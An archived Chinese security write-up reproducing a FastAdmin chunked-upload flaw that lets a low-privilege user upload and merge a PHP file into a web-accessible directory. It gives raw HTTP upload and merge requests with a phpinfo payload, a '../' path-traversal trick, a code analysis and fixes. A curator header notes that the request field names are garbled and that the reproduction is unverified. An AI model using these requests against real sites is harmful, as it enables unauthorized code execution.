---
version: "FastAdmin < V1.2.0.20210401_beta（原文声称；还要求开启默认关闭的分片传输）"
source: "MrWQ/vulnerability-paper"
product: "FastAdmin chunk-upload path handling"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "FastAdmin 前台分片传输上传文件 getshell 复现"
prerequisites: "来源所述条件，未列明部分仍待核：<V1.2.0.20210401_beta; low-priv account; chunking true(defaultfalse); webroot/path execution conditions"
side_effects: "未执行；本文需注意的操作影响：Upload request missing required file/chunkid/chunkindex names; cannot reproduce as text"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/gAerDNnDSl6864oyvDy4nA"
id: "vw-3b879b3cf426bb599e069b6b"
entity_id: "ve-3b879b3cf426bb599e069b6b"
schema_version: "1"
previous_version: "参考链接："
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;V1.2.0.20210401_beta; low-priv account; chunking true(defaultfalse); webroot/path execution conditions

代码与实验材料：Upload and merge flow, Windows lab, traversal discussion; multipart Content-Disposition lost field names; discusses disabling patched code

来源证据范围：Official package ZIP, original WeChat, XZ9395 and researcher article

- **适用与权限边界（1）**：Upload request missing required file/chunkid/chunkindex names; cannot reproduce as text。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **实验改动边界（2）**：Modified patched source must not be presented as unmodified vulnerable-release proof。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **事实待核（3）**：Bad version metadata and webroot-dependent RCE inference。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# FastAdmin 前台分片传输上传文件 getshell 复现

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gAerDNnDSl6864oyvDy4nA)

**上方蓝色字体关注我们，一起学安全！**

**作者：****Whippet****@Timeline Sec  
**

**本文字数：1624**

**阅读时长：5～6min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

_FastAdmin_ 是一款基于 ThinkPHP 5 + Bootstrap 的极速后台开发框架。致力于服务开发者, 快速搭建自己属于自己的后台。  

**0x02 漏洞概述**  

  

2021 年 3 月 28 日，360 漏洞云漏洞研究员发现，FastAdmin 框架存在有条件 RCE 漏洞，由于 FastAdmin 的前台文件上传功能中提供了分片传输功能, 但在合并分片文件时因对文件路径的拼接处理不当导致可上传任意文件。

**0x03 影响版本**  

  

FastAdmin < V1.2.0.20210401_beta  

且开启分片传输功能（默认关闭）

**0x04 环境搭建**  

  

在官网上下载 fastadmin，利用 phpstudy 搭建环境

```
https://package.fastadmin.net/full/1.2.0.20210125_full.zip
```

先开启分片上传功能，文件位置如下图  

![](../../.resource/remote/b031bc63eb42f88532c55f760f0f1836b9a07f7051b41bb16115fd1f2f6a5c6f.png)

访问 / public/install.php 进行安装，填写数据无脑下一步即可  

![](../../.resource/remote/c33f57a3d95e3f4b265a0126caa59435f98ff201fd4e81bca4aec25b0d0181f7.png)

**0x05 漏洞复现**  

  

漏洞需要一个低权限的账号  

所以我们需要在前台注册一个普通用户  

![](../../.resource/remote/cf94380c206557fafdb9da3d49f86ce9379be632a8ef1c781e32025449224d97.png)

登陆后在个人资料头像处抓包并上传 dog.jpg

![](../../.resource/remote/19e99ea8a5954c5109691483c320558000916df15777a2b71216ed0b34f89672.png)

更改上传数据包（需要注意图中几处红框的内容）  

![](../../.resource/remote/cea384ae3c39639006bcedb78625a94eec9f60efbc6e1afae0f4aa45fc67cb7e.png)  

```
POST /index/ajax/upload HTTP/1.1
Host: test.test
Content-Length: 418
Accept: application/json
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryurpjX18wIurjSyEp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rn1k8an9su59qb7ghosafer4vg; think_var=zh-cn; uid=2; token=aad3aa1e-1c65-4ee4-989a-bb3a82a4dd4a
Connection: close

------WebKitFormBoundaryurpjX18wIurjSyEp
Content-Disposition: form-data; 
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundaryurpjX18wIurjSyEp
Content-Disposition: form-data; ;

test.php
------WebKitFormBoundaryurpjX18wIurjSyEp
Content-Disposition: form-data; ;

------WebKitFormBoundaryurpjX18wIurjSyEp--
```

上传成功之后，会在网站路径  

C:\phpstudy_pro\WWW\fastadmin\runtime\chunks 下生成一个 test.php-0.part 文件

![](../../.resource/remote/4a70e57f47f1a51725f9c43b36661c407fa1772cb8cc602fd2b3f1671f803570.png)

发送数据包（需要注意图中几处红框的内容）

返回包显示 200 则代表合并成功  

![](../../.resource/remote/3b79e9f728d7bed9264aa67252c19333a862b841f18fc2f83fbb0f4a7e93f0ae.png)  

```
POST /index/ajax/upload HTTP/1.1
Host: tets.test
Content-Length: 42
Accept: application/json
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=mm4ejed8h7hubqq1stmogrut20; think_var=zh-cn; uid=2; token=f5a57bef-2ad2-496a-a4bc-66974bcc4a08
Connection: close

chunkid=test.php&chunkcount=1&action=merge
```

发包后访问  

/fastadmin/runtime/chunks/test.php

![](../../.resource/remote/02971e1ab8869eafe08c7586479ced186f64026d1bc155f6c0d364092a9fe580.png)  

![](../../.resource/remote/1084036d4b5b8b75d9b6e17c828d55021ebf5d05b6ccc164a14bf68a9a58fbaa.png)  

（漏洞利用存在很大的局限性，首先是需要开启支持分片传输，我在调试的过程中发现，在指定 host 解析，设定网站的根目录为 /fastadmin/public 之后就无法访问  /fastadmin/runtime/chunks 下的文件，虽说如此，但是可以通过设定 chunkid 的值为 ../xxx.php 就可以实现跨目录的上传）

**0x06 漏洞分析**  

  

根据漏洞描述需要开启支持分片上传，所以我们修改  

application/extra/upload.php 中 chunking 为 true  

![](../../.resource/remote/a34025ac29b50505cd546bc759b65fe1022dc9238a69db629fb7d97cfd205784.png)

同时最新版本已经修复存在的漏洞，修复位置为

application/common/library/Upload.php  

复现漏洞时，应注释这个部分

![](../../.resource/remote/48690939a302b6085acc8bb65c7212f748eab6980389f42005228259d4d29b93.png)

根据上传时的路由信息  

/index.php/index/ajax/upload  

定位至代码位置  

application/index/controller/Ajax.php

![](../../.resource/remote/d4d828dc98d7829f398115db27d24122c703fc9bdd50f417d406a9f5a6f5d4df.png)

漏洞的触发共分为两个过程，上传分片与合并分片

首先关注上传分片的过程 传入参数 chunckid 才会到上传分片的位置

\app\api\controller\Common::upload  

![](../../.resource/remote/bbae24853610063024718af106d7973d60d304b2ff971acb461f0c991eabd10b.png)

\app\common\library\Upload::chunk  

![](../../.resource/remote/db223b5862f856c83a9813c12582e5f335fe55cdeec9703fc3ffc2fc7be2edf2.png)

在 chunk 方法中，首先对 Content-Type 进行了校验，必须为 application/octet-stream 将传入的参数 chunckid  与  chunckindex 通过 - 连接，最后拼接 .part 最后保存到 /runtime/chunks/  

当我们传递的 $chunkid 为 test.php , $chunckindex 为 0 时 (参数选择为 0，还有别的原因，下表)，最后拼接出的分片文件名为 test.php-0.part

然后是合并分片文件的操作，需要传入参数 action=merge 才会到合并分片文件的函数  

![](../../.resource/remote/cd68983b06598beb1ac3d326a72649e7fbb7dab4718af074f506727997545c69.png)

\app\common\library\Upload::merge

![](../../.resource/remote/1c9c887abace0f70d23d1a10acd99d61bd4d9ccce9b5d2a2359c5e339d91048c.png)

在 merge 方法中会将 $chunkid 的值指定为最后保存的文件名，然后回根据传入的参数 $chunkcount 遍历查找是否分片文件上传完成，我们仅上传了一个分片文件，所以第一个分片文件应该设定为 0，此处 chunkcount 的值应为 1  

之后就将分片传输的文件写入指定的文件中，最后返回文件信息，即使最后报错提示是不允许的上传类型，但是文件已经保存到 /runtime/chunks/  路径下

在上传对文件名进行校验的情况下，利用分片传输的中最后重命名文件名的特点，绕过对文件名的校验，实现了任意文件上传

**0x07 修复方式**  

  

1、关闭分片传输  

修改 application/extra/upload.php 中 chunking 为 false

2、升级 FastAdmin 版本，其中对 chunkid 做正则判断

```
参考链接：
```

https://xz.aliyun.com/t/9395  

https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg  

![](../../.resource/remote/f7aeba0e95eb4a20920b4c212aa5fad609c078147e0fa0fb48ac7cd256ebd10d.png)

  

![](../../.resource/remote/c67f69ad0be4f67e52b7e4cc8900f4f6ea40aaedbccfc980185bb2fa117a4b7f.jpg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
